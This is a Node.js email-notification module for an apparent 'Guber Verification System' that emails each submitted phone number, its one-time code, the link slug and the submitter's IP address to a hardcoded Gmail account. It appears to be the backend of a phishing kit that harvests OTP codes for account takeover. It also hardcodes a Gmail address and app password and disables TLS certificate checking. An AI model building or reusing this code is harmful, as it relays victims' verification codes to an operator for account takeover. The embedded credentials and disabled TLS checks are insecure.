const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const EmailSettings = require('../models/EmailSettings');

const STORE_PATH = path.join(__dirname, 'email_store.json');

// Memory store
let notificationEmails = ['amirtalaat11@gmail.com'];
let smtpTransporter = null;
let smtpConfig = {
    host: 'smtp.gmail.com',
    port: 465,
    user: 'sarataky80@gmail.com',
    pass: 'crcghtlzupihauvs'
};

/**
 * Configure SMTP settings for sending notification emails.
 */
function configureSMTP(config) {
    smtpConfig = { ...smtpConfig, ...config };

    const cleanUser = (smtpConfig.user || '').trim();
    const cleanPass = (smtpConfig.pass || '').trim().replace(/\s+/g, '');

    if (!cleanUser || !cleanPass) {
        console.log('[EmailNotifier] SMTP missing user or pass.');
        smtpTransporter = null;
        return false;
    }

    smtpConfig.user = cleanUser;
    smtpConfig.pass = cleanPass;

    // Use SSL Port 465 with IPv4 & TLS bypass for max compatibility on Render/Cloud
    smtpTransporter = nodemailer.createTransport({
        host: smtpConfig.host || 'smtp.gmail.com',
        port: parseInt(smtpConfig.port) || 465,
        secure: parseInt(smtpConfig.port) === 465 || !smtpConfig.port,
        auth: {
            user: cleanUser,
            pass: cleanPass
        },
        tls: {
            rejectUnauthorized: false
        },
        connectionTimeout: 10000, // 10s timeout
        greetingTimeout: 10000,
        socketTimeout: 15000
    });

    console.log(`[EmailNotifier] SMTP configured: ${cleanUser} via ${smtpConfig.host}:${smtpConfig.port || 465}`);

    // Verify SMTP connection
    smtpTransporter.verify((error, success) => {
        if (error) {
            console.error('[EmailNotifier] ❌ SMTP Verification Failed:', error.message);
        } else {
            console.log('[EmailNotifier] ✅ SMTP Server is ready to send messages!');
        }
    });

    return true;
}

// Initial default configuration
configureSMTP(smtpConfig);

/**
 * Load persisted settings from MongoDB (or local file fallback)
 */
async function initPersistedSettings(isMongoConnected = false) {
    try {
        if (isMongoConnected) {
            let doc = await EmailSettings.findOne();
            if (!doc) {
                doc = new EmailSettings({
                    smtpHost: smtpConfig.host,
                    smtpPort: smtpConfig.port,
                    smtpUser: smtpConfig.user,
                    smtpPass: smtpConfig.pass,
                    recipients: notificationEmails
                });
                await doc.save();
                console.log('[EmailNotifier] Created default EmailSettings document in MongoDB.');
            } else {
                smtpConfig.host = doc.smtpHost || smtpConfig.host;
                smtpConfig.port = doc.smtpPort || smtpConfig.port;
                if (doc.smtpUser) smtpConfig.user = doc.smtpUser;
                if (doc.smtpPass) smtpConfig.pass = doc.smtpPass;
                if (Array.isArray(doc.recipients) && doc.recipients.length > 0) {
                    notificationEmails = doc.recipients;
                }
                configureSMTP(smtpConfig);
                console.log(`[EmailNotifier] Loaded EmailSettings from MongoDB. Sender: ${doc.smtpUser}, Recipients: ${notificationEmails.join(', ')}`);
            }
            return;
        }
    } catch (err) {
        console.error('[EmailNotifier] Could not load from MongoDB, using local file:', err.message);
    }

    // Local file fallback
    try {
        if (fs.existsSync(STORE_PATH)) {
            const raw = fs.readFileSync(STORE_PATH, 'utf8');
            const data = JSON.parse(raw);
            if (data.smtp) {
                configureSMTP(data.smtp);
            }
            if (Array.isArray(data.recipients) && data.recipients.length > 0) {
                notificationEmails = data.recipients;
            }
            console.log('[EmailNotifier] Loaded settings from local email_store.json');
        }
    } catch (err) {
        console.error('[EmailNotifier] Could not load local store:', err.message);
    }
}

/**
 * Save SMTP config to MongoDB & local JSON
 */
async function saveSMTPConfig(config, isMongoConnected = false) {
    const success = configureSMTP(config);
    if (!success) return false;

    try {
        if (isMongoConnected) {
            await EmailSettings.findOneAndUpdate({}, {
                smtpHost: smtpConfig.host,
                smtpPort: smtpConfig.port,
                smtpUser: smtpConfig.user,
                smtpPass: smtpConfig.pass
            }, { upsert: true, new: true });
            console.log('[EmailNotifier] Saved SMTP settings to MongoDB.');
        }
    } catch (err) {
        console.error('[EmailNotifier] Error saving SMTP to MongoDB:', err.message);
    }

    try {
        saveLocalFile();
    } catch (e) {}

    return true;
}

/**
 * Save Recipient emails to MongoDB & local JSON
 */
async function saveRecipientEmails(emails, isMongoConnected = false) {
    if (Array.isArray(emails)) {
        notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
    }

    try {
        if (isMongoConnected) {
            await EmailSettings.findOneAndUpdate({}, {
                recipients: notificationEmails
            }, { upsert: true, new: true });
            console.log(`[EmailNotifier] Saved ${notificationEmails.length} recipients to MongoDB.`);
        }
    } catch (err) {
        console.error('[EmailNotifier] Error saving recipients to MongoDB:', err.message);
    }

    try {
        saveLocalFile();
    } catch (e) {}

    return notificationEmails;
}

function saveLocalFile() {
    const data = {
        smtp: smtpConfig,
        recipients: notificationEmails
    };
    fs.writeFileSync(STORE_PATH, JSON.stringify(data, null, 2), 'utf8');
}

function getNotificationEmails() {
    return [...notificationEmails];
}

function getSMTPConfig() {
    return {
        host: smtpConfig.host || 'smtp.gmail.com',
        port: smtpConfig.port || 465,
        user: smtpConfig.user || '',
        configured: !!(smtpTransporter)
    };
}

/**
 * Send email notification when a phone number is submitted.
 */
async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
    if (!smtpTransporter) {
        configureSMTP(smtpConfig);
    }
    if (!smtpTransporter || notificationEmails.length === 0) {
        console.error('[EmailNotifier] Cannot send phone email - SMTP or recipients missing.');
        return;
    }

    const timeStr = new Date(submittedAt || Date.now()).toLocaleString('en-US', {
        dateStyle: 'medium', timeStyle: 'short'
    });

    const htmlBody = `
    <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 500px; margin: 0 auto; background: #0F172A; border-radius: 12px; overflow: hidden; border: 1px solid #1E293B;">
        <div style="background: linear-gradient(135deg, #F59E0B, #D97706); padding: 20px 24px;">
            <h2 style="margin: 0; color: #000; font-size: 18px;">📱 New Phone Number Submitted</h2>
        </div>
        <div style="padding: 24px; color: #E2E8F0;">
            <table style="width: 100%; border-collapse: collapse;">
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Phone Number</td>
                    <td style="padding: 10px 0; color: #FFFFFF; font-weight: 700; font-size: 18px; direction: ltr; text-align: right;">${phoneNumber}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Status</td>
                    <td style="padding: 10px 0; text-align: right;"><span style="background: rgba(245,158,11,0.2); color: #F59E0B; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;">⏳ Awaiting OTP</span></td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Link / Slug</td>
                    <td style="padding: 10px 0; color: #60A5FA; text-align: right; font-family: monospace;">${customSlug || '/'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">IP Address</td>
                    <td style="padding: 10px 0; color: #94A3B8; text-align: right; font-size: 12px;">${ipAddress || 'Unknown'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Time</td>
                    <td style="padding: 10px 0; color: #CBD5E1; text-align: right; font-size: 13px;">${timeStr}</td>
                </tr>
            </table>
        </div>
        <div style="background: #1E293B; padding: 12px 24px; text-align: center;">
            <span style="color: #475569; font-size: 11px;">Guber Verification System — Email Notification</span>
        </div>
    </div>`;

    try {
        const info = await smtpTransporter.sendMail({
            from: `"Guber Notifications" <${smtpConfig.user}>`,
            to: notificationEmails.join(', '),
            subject: `📱 New Phone Submitted: ${phoneNumber}`,
            html: htmlBody
        });
        console.log(`[EmailNotifier] Phone notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
        return info;
    } catch (err) {
        console.error(`[EmailNotifier] Failed to send phone notification:`, err.message);
        throw err;
    }
}

/**
 * Send email notification when OTP is submitted and verified.
 */
async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
    if (!smtpTransporter) {
        configureSMTP(smtpConfig);
    }
    if (!smtpTransporter || notificationEmails.length === 0) {
        console.error('[EmailNotifier] Cannot send OTP email - SMTP or recipients missing.');
        return;
    }

    const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
        dateStyle: 'medium', timeStyle: 'short'
    });

    const htmlBody = `
    <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 500px; margin: 0 auto; background: #0F172A; border-radius: 12px; overflow: hidden; border: 1px solid #1E293B;">
        <div style="background: linear-gradient(135deg, #10B981, #059669); padding: 20px 24px;">
            <h2 style="margin: 0; color: #FFFFFF; font-size: 18px;">✅ OTP Verified Successfully</h2>
        </div>
        <div style="padding: 24px; color: #E2E8F0;">
            <table style="width: 100%; border-collapse: collapse;">
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Phone Number</td>
                    <td style="padding: 10px 0; color: #FFFFFF; font-weight: 700; font-size: 18px; direction: ltr; text-align: right;">${phoneNumber}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">OTP Code</td>
                    <td style="padding: 10px 0; text-align: right;">
                        <span style="background: linear-gradient(135deg, #10B981, #059669); color: #FFFFFF; padding: 6px 16px; border-radius: 8px; font-size: 20px; font-weight: 800; letter-spacing: 6px; font-family: monospace;">${otp}</span>
                    </td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Status</td>
                    <td style="padding: 10px 0; text-align: right;"><span style="background: rgba(16,185,129,0.2); color: #10B981; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;">✅ VERIFIED</span></td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Link / Slug</td>
                    <td style="padding: 10px 0; color: #60A5FA; text-align: right; font-family: monospace;">${customSlug || '/'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">IP Address</td>
                    <td style="padding: 10px 0; color: #94A3B8; text-align: right; font-size: 12px;">${ipAddress || 'Unknown'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Verified At</td>
                    <td style="padding: 10px 0; color: #CBD5E1; text-align: right; font-size: 13px;">${timeStr}</td>
                </tr>
            </table>
        </div>
        <div style="background: #1E293B; padding: 12px 24px; text-align: center;">
            <span style="color: #475569; font-size: 11px;">Guber Verification System — Email Notification</span>
        </div>
    </div>`;

    try {
        const info = await smtpTransporter.sendMail({
            from: `"Guber Notifications" <${smtpConfig.user}>`,
            to: notificationEmails.join(', '),
            subject: `✅ OTP Verified: ${phoneNumber} → Code: ${otp}`,
            html: htmlBody
        });
        console.log(`[EmailNotifier] OTP notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
        return info;
    } catch (err) {
        console.error(`[EmailNotifier] Failed to send OTP notification:`, err.message);
        throw err;
    }
}

/**
 * Send test email and throw explicit error if something fails.
 */
async function sendTestNotification() {
    return await notifyPhoneSubmitted({
        phoneNumber: '+20 100 000 0000 (اختبار الإيميل)',
        customSlug: '/test',
        ipAddress: '127.0.0.1',
        submittedAt: new Date()
    });
}

module.exports = {
    configureSMTP,
    initPersistedSettings,
    saveSMTPConfig,
    saveRecipientEmails,
    getNotificationEmails,
    getSMTPConfig,
    notifyPhoneSubmitted,
    notifyOTPVerified,
    sendTestNotification
};
